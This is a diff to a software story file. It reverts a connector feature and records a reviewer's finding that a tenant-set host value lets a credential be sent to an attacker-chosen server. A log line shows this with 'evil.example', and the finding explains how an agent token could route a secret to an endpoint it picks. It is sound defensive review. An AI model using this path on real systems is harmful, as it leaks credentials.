@@ -1,7 +1,7 @@
 ---
 id: X-47
 title: "A connector with a templated host can actually be invoked"
-status: done
+status: blocked
 epic: connections
 design: docs/designs/connection-settings.md
 areas: [exchange-server, exchange-host]
@@ -30,16 +30,16 @@ X-11 brought in `connector-address` 0.9 with C-406's instance dimension, and X-1
 uses it.
 
 ## Acceptance
-- [x] **Failing-first test** — a connector with a templated `base_url` is invoked successfully after
+- [ ] **Failing-first test** — a connector with a templated `base_url` is invoked successfully after
       its per-connection value is supplied, and fails before the value can be supplied.
-- [x] The value is **per connection and per tenant**, derived from the resolved principal like every
+- [ ] The value is **per connection and per tenant**, derived from the resolved principal like every
       other address on this surface. No route accepts a tenant.
-- [x] A connection missing a value its connector declares is still **refused by name** — this story
+- [ ] A connection missing a value its connector declares is still **refused by name** — this story
       adds a way to supply the value, it does not weaken the refusal.
-- [x] **Configuration is not a credential and must not be stored as one.** A subdomain is not a
+- [ ] **Configuration is not a credential and must not be stored as one.** A subdomain is not a
       secret; putting it in the credential store would make `held` and the occupancy bound mean two
       different things. Decide where it lives and argue it.
-- [x] The existing invoke tests stay green unmodified, including
+- [ ] The existing invoke tests stay green unmodified, including
       `no_parameter_can_move_the_destination_host` — **supplying configuration must not become a way
       for a caller to name a host.** That is the invariant this story is most able to break.
 
@@ -86,3 +86,61 @@ uses it.
 - **Filed as adjacent:** `console/` does not know these routes exist, which is what turns this from an
   API into a feature; and `GET /api/connections/{connector}` still reports `held: true` for a
   connection that holds a token but no subdomain and will refuse every invocation.
+
+## REVERTED 2026-08-01 — the review found a credential-exfiltration path
+
+`impl/X-47` was merged as `90ee254` and **reverted as `dcae5a1`**. The branch is untouched and keeps
+its history; rework is in flight.
+
+**Measured end to end by the reviewer, not argued:**
+
+```
+newrelic endpoint.host="evil.example"  stored_ok=true outcome=OK
+  urls=["https://evil.example/v2/applications.json"]  SECRET_ON_WIRE=true
+```
+
+For **`newrelic` and `docusign` the tenant-supplied setting is the entire destination authority** —
+`connector-catalog` declares `base_url: "https://{host}/v2"` with `hosts: ["{host}"]`, and
+`"https://{account_host}/restapi/..."`. The design's defence — that `connector-pack` validates the
+composed authority against an allow-list of host *characters* — constrains the **characters** of the
+value, not the **identity** of the host. Sound where the template pins a suffix
+(`{subdomain}.zendesk.com`); **vacuous where the variable is the whole authority**.
+
+**The writer needs no special standing.** The settings route is `Access::Principal`, which
+`require_principal` admits for *any* kind, and agent tokens resolve to `PrincipalKind::Agent`. So an
+agent holding only an operation grant converts it into delivery of the raw credential to an endpoint
+it chose.
+
+It breaks two things **by name**:
+
+- This story's own Acceptance item 5, verbatim: *"supplying configuration must not become a way for
+  a caller to name a host. That is the invariant this story is most able to break."*
+- `AGENTS.md` § Invariants: *"An agent's token grants access to an operation, never to a credential."*
+
+**New reachability:** before the diff, `execution::invoker` bound `MemoryConfig::new()`, so both
+connectors refused before dispatch. The evidence test drove **zendesk only** — the one shape where
+the property is structurally free.
+
+**The distinction needed to fix it is already published, with no new dependency:**
+`connector_catalog::Operation` carries `hosts`, so `"{host}"` and `"{account_host}"` are
+distinguishable from `"{subdomain}.zendesk.com"` and `"api.bitbucket.org"` — a template that pins no
+suffix is a template whose variable *is* the authority.
+
+### Also found, to fold into the rework
+- **The route's allowance check contradicts its own comment** — it calls `admit_tenant_settings`
+  without subtracting what the write replaces, directly under a comment saying it decides "against
+  what the write **replaces**". `SettingsStore::set` *does* subtract. A tenant at the bound is
+  refused a same-size rotation the store would have accepted.
+- **The count is 17, not 16** — off by one in the same direction the original thirteen was. `twilio`
+  is equally uninvocable and is named in the design's own section 3 as needing a username, but
+  excluded from its headline.
+- `SettingsStore::bind` does not refuse a pre-existing widened mode where `CredentialStore` does.
+  Argued in the code as deliberate; noted, not blocking.
+- **`connector_pack::Rehearsal` is a third pack entry point lock 2 does not count.** It cannot
+  dispatch today — no `Egress`, no `execute` — but the scanner would not notice if it became able to.
+
+### What the review cleared
+The widened address guard (26 hostile `{service}`/`{field}` spellings, all refused, store file never
+created), the verbatim `credentials.rs` move (one doc word changed; all five escape tests survive),
+configuration-is-not-a-credential, the rollback path, and the `paths` module being **private** rather
+than new public surface as I had assumed.
